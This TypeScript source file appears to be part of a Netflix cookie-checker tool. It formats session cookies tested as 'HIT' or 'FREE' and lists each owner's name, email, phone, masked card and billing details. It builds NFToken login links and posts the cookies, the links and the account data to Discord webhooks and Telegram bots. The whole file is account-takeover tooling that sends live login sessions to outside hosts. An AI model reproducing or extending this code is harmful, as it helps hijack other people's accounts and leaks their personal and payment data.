import type { AppConfig, AccountInfo, NfTokenData, NotificationMode, EmojiMode } from "./types.js";
import {
  decodeValue,
  normalizeOutputValue,
  formatMemberSince,
  formatDisplayDate,
  normalizePlanKey,
  formatCountryWithFlag,
  formatBooleanLabel,
  escapeHtml,
} from "./utils.js";
import { derivePlanInfo, isExtraMemberAccount } from "./plan.js";
import { buildNfTokenLinks, hasUsableNfToken, getNfTokenExpiryUnix } from "./nftoken.js";

const EMOJI_MAP: Record<string, string> = {
  "Status": "📌", "Name": "👤", "Email": "📧", "Country": "🌍",
  "Plan": "📦", "Member Since": "📅", "Next Billing": "🗓️",
  "Payment": "💳", "Card": "💳", "Phone": "📱", "Quality": "🎞️",
  "Streams": "📺", "Price": "💰", "Hold Status": "⏸️",
  "Extra Member": "👥", "Email Verified": "✅",
  "Membership Status": "🛡️", "Profiles": "🎭", "User GUID": "🆔",
  "Valid Till": "⏳", "Valid Till (UTC)": "⏳",
};

function decorateLabel(label: string, enabled: boolean): string {
  if (!enabled) return label || "";
  let normalized = decodeValue(label) || String(label || "").trim();
  if (normalized.startsWith("Profiles (")) normalized = "Profiles";
  const emoji = EMOJI_MAP[normalized];
  return emoji ? `${emoji} ${label}` : label;
}

export function getNfTokenMode(config: AppConfig): string {
  const raw = config.nftoken;
  if (typeof raw === "boolean") return raw ? "both" : "false";
  const lowered = String(raw).trim().toLowerCase();
  if (["false", "off", "none", "disabled", "0"].includes(lowered)) return "false";
  if (["pc", "desktop", "computer"].includes(lowered)) return "pc";
  if (["mobile", "phone"].includes(lowered)) return "mobile";
  if (["both", "all", "true", "on", "1"].includes(lowered)) return "both";
  return "both";
}

export function getEmojiMode(config: AppConfig): EmojiMode {
  const raw = config.add_emojis as any;
  if (typeof raw === "boolean") return raw ? "both" : "false";
  const lowered = String(raw || "webhook").trim().toLowerCase();
  if (["false", "off", "none", "0", "no"].includes(lowered)) return "false";
  if (["txt", "file", "output"].includes(lowered)) return "txt";
  if (["webhook", "notify", "notification", "telegram", "tg"].includes(lowered)) return "webhook";
  if (["both", "all", "true", "on", "1"].includes(lowered)) return "both";
  return "webhook";
}

function shouldAddEmojis(config: AppConfig, target: "txt" | "webhook"): boolean {
  const mode = getEmojiMode(config);
  if (target === "txt") return ["txt", "both"].includes(mode);
  return ["webhook", "both"].includes(mode);
}

const FREE_HIDDEN_FIELDS = new Set([
  "member_since", "next_billing", "payment_method", "card", "phone",
  "quality", "max_streams", "plan_price", "extra_members", "membership_status",
]);

export function buildAccountDetailLines(
  config: AppConfig,
  info: AccountInfo,
  isSubscribed: boolean,
  useEmojis = false
): string[] {
  const txtFields = config.txt_fields;
  const [, normalizedPlanLabel] = derivePlanInfo(info, isSubscribed);
  const countryValue = info.countryOfSignup;
  const renderedCountry = formatCountryWithFlag(countryValue);

  const values: Record<string, string> = {
    name: normalizeOutputValue(info.accountOwnerName),
    email: normalizeOutputValue(info.email),
    country: renderedCountry,
    plan: normalizeOutputValue(normalizedPlanLabel),
    member_since: formatMemberSince(info.memberSince),
    next_billing: formatDisplayDate(info.nextBillingDate),
    payment_method: normalizeOutputValue(info.paymentMethodType, "UNKNOWN", true),
    card: normalizeOutputValue(info.maskedCard, "N/A", true),
    phone: normalizeOutputValue(info.phoneDisplay),
    quality: normalizeOutputValue(info.videoQuality),
    max_streams: normalizeOutputValue((info.maxStreams || "").replace(/}$/, "")),
    plan_price: normalizeOutputValue(info.planPrice, "N/A"),
    hold_status: normalizeOutputValue(info.holdStatus),
    extra_members: normalizeOutputValue(info.showExtraMemberSection),
    email_verified: normalizeOutputValue(info.emailVerified),
    membership_status: normalizeOutputValue(info.membershipStatus),
    profiles: normalizeOutputValue(info.profilesDisplay),
    user_guid: normalizeOutputValue(info.userGuid),
  };

  const labels: Array<[string, string]> = [
    ["name", "Name"], ["email", "Email"], ["country", "Country"],
    ["plan", "Plan"], ["member_since", "Member Since"],
    ["next_billing", "Next Billing"], ["payment_method", "Payment"],
    ["card", "Card"], ["phone", "Phone"], ["quality", "Quality"],
    ["max_streams", "Streams"], ["plan_price", "Price"],
    ["hold_status", "Hold Status"], ["extra_members", "Extra Member"],
    ["email_verified", "Email Verified"], ["membership_status", "Membership Status"],
    ["profiles", "Profiles"], ["user_guid", "User GUID"],
  ];

  const lines: string[] = [];
  for (const [key, label] of labels) {
    if (!isSubscribed && FREE_HIDDEN_FIELDS.has(key)) continue;
    if (key === "card" && values["payment_method"]?.toUpperCase() !== "CC") continue;
    if (key === "extra_members" && values[key] !== "Yes") continue;
    if (key === "hold_status" && !["Yes", "No"].includes(values[key])) continue;
    if (txtFields[key as keyof typeof txtFields] !== false) {
      let renderedLabel = label;
      if (key === "profiles" && info.profileCount) {
        renderedLabel = `Profiles (${info.profileCount})`;
      }
      if (useEmojis) renderedLabel = decorateLabel(renderedLabel, true);
      lines.push(`${renderedLabel}: ${values[key]}`);
    }
  }
  return lines;
}

export function formatCookieFile(
  config: AppConfig,
  info: AccountInfo,
  cookieContent: string,
  isSubscribed: boolean,
  nfTokenData: NfTokenData | null = null
): string {
  const nfTokenMode = getNfTokenMode(config);
  const txtEmojis = shouldAddEmojis(config, "txt");
  const divider = "-".repeat(98);
  const usableNfToken = hasUsableNfToken(nfTokenData);

  const lines: string[] = [`NETFLIX ${isSubscribed ? "HIT" : "FREE"} :👇`, ""];
  lines.push(...buildAccountDetailLines(config, info, isSubscribed, txtEmojis));

  if (isSubscribed && nfTokenMode !== "false" && usableNfToken) {
    const links = buildNfTokenLinks(nfTokenData!.token, nfTokenMode);
    lines.push("", divider, "", "NFToken DETAILS :👇", "");
    lines.push(`NFToken: ${nfTokenData!.token}`);
    for (const [label, link] of links) {
      lines.push(`${label}: ${link}`);
    }
    if (nfTokenData?.expires_at_utc) {
      const validLabel = decorateLabel("Valid Till (UTC)", txtEmojis);
      lines.push(`${validLabel}: ${nfTokenData.expires_at_utc}`);
    }
  }

  lines.push("", divider, "", "Netflix COOKIE :👇", "", cookieContent.trim(), "");
  return lines.join("\n");
}

function buildNotificationDetails(
  config: AppConfig,
  info: AccountInfo,
  isSubscribed: boolean
): string[] {
  const status = isSubscribed ? "Subscribed" : "Working (No Subscription)";
  let lines: string[];
  if (!isSubscribed) {
    const [, planLabel] = derivePlanInfo(info, isSubscribed);
    const profilesValue = normalizeOutputValue(info.profilesDisplay);
    const profileLabel = info.profileCount ? `Profiles (${info.profileCount})` : "Profiles";
    lines = [
      `Name: ${normalizeOutputValue(info.accountOwnerName)}`,
      `Email: ${normalizeOutputValue(info.email)}`,
      `Country: ${formatCountryWithFlag(info.countryOfSignup)}`,
      `Plan: ${normalizeOutputValue(planLabel)}`,
      `Email Verified: ${normalizeOutputValue(info.emailVerified)}`,
      `${profileLabel}: ${profilesValue}`,
      `User GUID: ${normalizeOutputValue(info.userGuid)}`,
    ];
  } else {
    lines = buildAccountDetailLines(config, info, isSubscribed);
  }
  return [`Status: ${status}`, ...lines];
}

function buildDiscordFullMessage(
  config: AppConfig,
  info: AccountInfo,
  isSubscribed: boolean,
  nfTokenData: NfTokenData | null,
  useEmojis: boolean
): string {
  const lines = [
    "# [Netflix Cookie](https://github.com/harshitkamboj/Netflix-Cookie-Checker)",
    "", "Cookie details",
  ];
  for (const line of buildNotificationDetails(config, info, isSubscribed)) {
    const [label, ...rest] = line.split(": ");
    const value = rest.join(": ");
    lines.push(`**${decorateLabel(label, useEmojis)}:** ${value}`);
  }

  const nfTokenMode = getNfTokenMode(config);
  if (isSubscribed && hasUsableNfToken(nfTokenData)) {
    const links = buildNfTokenLinks(nfTokenData!.token, nfTokenMode);
    if (links.length) {
      lines.push("");
      for (const [label, link] of links) {
        lines.push(`**${label}:** [Click here](${link})`);
      }
      const expiryUnix = getNfTokenExpiryUnix(nfTokenData!.expires_at_utc);
      if (expiryUnix !== null) {
        lines.push(`**${decorateLabel("Valid Till", useEmojis)}:** <t:${expiryUnix}:R>`);
      }
    }
  }
  lines.push("", "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)**");
  return lines.join("\n");
}

function buildDiscordCookieMessage(cookieContent: string): string {
  return [
    "# [Netflix Cookie](https://github.com/harshitkamboj/Netflix-Cookie-Checker)",
    "", "Cookie details", "```txt", cookieContent.trim(), "```",
    "", "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)**",
  ].join("\n");
}

function buildDiscordNfTokenMessage(
  info: AccountInfo,
  nfTokenData: NfTokenData,
  nfTokenMode: string,
  useEmojis: boolean
): string {
  const [, planLabel] = derivePlanInfo(info, true);
  const countryValue = decodeValue(info.countryOfSignup) || "UNKNOWN";
  const flag = formatCountryWithFlag(countryValue);

  const lines = ["# [Netflix NFToken](https://github.com/harshitkamboj/Netflix-Cookie-Checker)", ""];
  const links = buildNfTokenLinks(nfTokenData.token, nfTokenMode);
  if (links.length) {
    lines.push(`**${decorateLabel("Plan", useEmojis)}:** ${planLabel}`);
    lines.push(`**${decorateLabel("Country", useEmojis)}:** ${flag}`);
    lines.push("");
    for (const [label, link] of links) {
      lines.push(`**${label}:** [Click here](${link})`);
    }
    const expiryUnix = getNfTokenExpiryUnix(nfTokenData.expires_at_utc);
    if (expiryUnix !== null) {
      lines.push(`**${decorateLabel("Valid Till", useEmojis)}:** <t:${expiryUnix}:R>`);
    }
  } else {
    lines.push("NFToken unavailable");
  }
  lines.push("", "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)**");
  return lines.join("\n");
}

function buildTelegramFullMessage(
  config: AppConfig,
  info: AccountInfo,
  isSubscribed: boolean,
  nfTokenData: NfTokenData | null,
  useEmojis: boolean
): string {
  const lines = [
    '<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix Cookie</a></b>',
    "", "<b>Cookie details</b>",
  ];
  for (const line of buildNotificationDetails(config, info, isSubscribed)) {
    const [label, ...rest] = line.split(": ");
    const value = rest.join(": ");
    lines.push(`<b>${escapeHtml(decorateLabel(label, useEmojis))}:</b> ${escapeHtml(value)}`);
  }

  const nfTokenMode = getNfTokenMode(config);
  if (isSubscribed && hasUsableNfToken(nfTokenData)) {
    const links = buildNfTokenLinks(nfTokenData!.token, nfTokenMode);
    if (links.length) {
      lines.push("");
      for (const [label, link] of links) {
        lines.push(`<b>${escapeHtml(label)}:</b> <a href="${escapeHtml(link)}">Click here</a>`);
      }
      if (nfTokenData!.expires_at_utc) {
        lines.push(`<b>${escapeHtml(decorateLabel("Valid Till (UTC)", useEmojis))}:</b> ${escapeHtml(nfTokenData!.expires_at_utc)}`);
      }
    }
  }
  lines.push("", '<b><a href="https://github.com/harshitkamboj">Github</a></b> | <b><a href="https://harshitkamboj.in">Website</a></b>');
  return lines.join("\n");
}

function buildTelegramCookieMessage(cookieContent: string): string {
  return [
    '<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix Cookie</a></b>',
    "", "<b>Cookie details</b>",
    `<code>${escapeHtml(cookieContent.trim())}</code>`,
    "", '<b><a href="https://github.com/harshitkamboj">Github</a></b> | <b><a href="https://harshitkamboj.in">Website</a></b>',
  ].join("\n");
}

function buildTelegramNfTokenMessage(
  info: AccountInfo,
  nfTokenData: NfTokenData,
  nfTokenMode: string,
  useEmojis: boolean
): string {
  const [, planLabel] = derivePlanInfo(info, true);
  const countryValue = decodeValue(info.countryOfSignup) || "UNKNOWN";
  const flag = formatCountryWithFlag(countryValue);

  const lines = ['<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix NFToken</a></b>', ""];
  const links = buildNfTokenLinks(nfTokenData.token, nfTokenMode);
  if (links.length) {
    lines.push(`<b>${escapeHtml(decorateLabel("Plan", useEmojis))}:</b> ${escapeHtml(planLabel)}`);
    lines.push(`<b>${escapeHtml(decorateLabel("Country", useEmojis))}:</b> ${escapeHtml(flag)}`);
    lines.push("");
    for (const [label, link] of links) {
      lines.push(`<b>${escapeHtml(label)}:</b> <a href="${escapeHtml(link)}">Click here</a>`);
    }
    if (nfTokenData.expires_at_utc) {
      lines.push(`<b>${escapeHtml(decorateLabel("Valid Till", useEmojis))}:</b> ${escapeHtml(nfTokenData.expires_at_utc)}`);
    }
  } else {
    lines.push("NFToken unavailable");
  }
  lines.push("", '<b><a href="https://github.com/harshitkamboj">Github</a></b> | <b><a href="https://harshitkamboj.in">Website</a></b>');
  return lines.join("\n");
}

function isPlanAllowed(channelPlans: string | string[], planKey: string): boolean {
  if (!channelPlans) return true;
  if (typeof channelPlans === "string") {
    const normalized = channelPlans.trim().toLowerCase();
    if (["", "all", "*"].includes(normalized)) return true;
    const allowed = new Set(normalized.split(",").map((s) => s.trim()).filter(Boolean));
    return allowed.has((planKey || "").toLowerCase());
  }
  if (Array.isArray(channelPlans)) {
    const allowed = new Set(channelPlans.map((s) => String(s).trim().toLowerCase()).filter(Boolean));
    if (!allowed.size) return true;
    return allowed.has((planKey || "").toLowerCase());
  }
  return true;
}

async function sendDiscordWebhook(
  url: string,
  message: string,
  fileName?: string,
  fileContent?: string
): Promise<void> {
  if (!url) return;
  try {
    const payload: any = {
      content: message,
      flags: 4,
      username: "Netflix Checker",
    };
    if (fileName && fileContent) {
      const formData = new FormData();
      formData.append("payload_json", JSON.stringify(payload));
      formData.append("file", new Blob([fileContent], { type: "text/plain" }), fileName);
      await fetch(url, { method: "POST", body: formData });
    } else {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    }
  } catch { /* ignore */ }
}

async function sendTelegram(
  botToken: string,
  chatId: string,
  message: string,
  fileName?: string,
  fileContent?: string
): Promise<void> {
  if (!botToken || !chatId) return;
  try {
    if (fileName && fileContent) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("caption", message);
      formData.append("parse_mode", "HTML");
      formData.append("document", new Blob([fileContent], { type: "text/plain" }), fileName);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: "POST", body: formData,
      });
    } else {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId, text: message, parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      });
    }
  } catch { /* ignore */ }
}

export async function sendNotifications(
  config: AppConfig,
  info: AccountInfo,
  isSubscribed: boolean,
  outputFilename: string,
  formattedCookie: string,
  rawCookieContent: string,
  nfTokenData: NfTokenData | null = null
): Promise<void> {
  const notifications = config.notifications;
  const webhookCfg = notifications.webhook;
  const telegramCfg = notifications.telegram;
  const webhookMode = String(webhookCfg.mode || "full").toLowerCase() as NotificationMode;
  const telegramMode = String(telegramCfg.mode || "full").toLowerCase() as NotificationMode;
  const nfTokenMode = getNfTokenMode(config);
  const notificationEmojis = shouldAddEmojis(config, "webhook");
  const [planKey] = derivePlanInfo(info, isSubscribed);
  const usableNfToken = hasUsableNfToken(nfTokenData);

  if (webhookCfg.enabled) {
    if (webhookMode === "cookie") {
      if (isPlanAllowed(webhookCfg.plans, planKey)) {
        await sendDiscordWebhook(
          webhookCfg.url,
          buildDiscordFullMessage(config, info, isSubscribed, null, notificationEmojis),
          outputFilename, rawCookieContent
        );
      }
    } else if (webhookMode === "nftoken") {
      if (isSubscribed && usableNfToken) {
        await sendDiscordWebhook(
          webhookCfg.url,
          buildDiscordNfTokenMessage(info, nfTokenData!, nfTokenMode, notificationEmojis)
        );
      }
    } else {
      if (isPlanAllowed(webhookCfg.plans, planKey)) {
        await sendDiscordWebhook(
          webhookCfg.url,
          buildDiscordFullMessage(config, info, isSubscribed, nfTokenData, notificationEmojis),
          outputFilename, formattedCookie
        );
      }
    }
  }

  if (telegramCfg.enabled) {
    if (telegramMode === "cookie") {
      if (isPlanAllowed(telegramCfg.plans, planKey)) {
        await sendTelegram(
          telegramCfg.bot_token, telegramCfg.chat_id,
          buildTelegramFullMessage(config, info, isSubscribed, null, notificationEmojis),
          outputFilename, rawCookieContent
        );
      }
    } else if (telegramMode === "nftoken") {
      if (isSubscribed && usableNfToken) {
        await sendTelegram(
          telegramCfg.bot_token, telegramCfg.chat_id,
          buildTelegramNfTokenMessage(info, nfTokenData!, nfTokenMode, notificationEmojis)
        );
      }
    } else {
      if (isPlanAllowed(telegramCfg.plans, planKey)) {
        await sendTelegram(
          telegramCfg.bot_token, telegramCfg.chat_id,
          buildTelegramFullMessage(config, info, isSubscribed, nfTokenData, notificationEmojis),
          outputFilename, formattedCookie
        );
      }
    }
  }
}
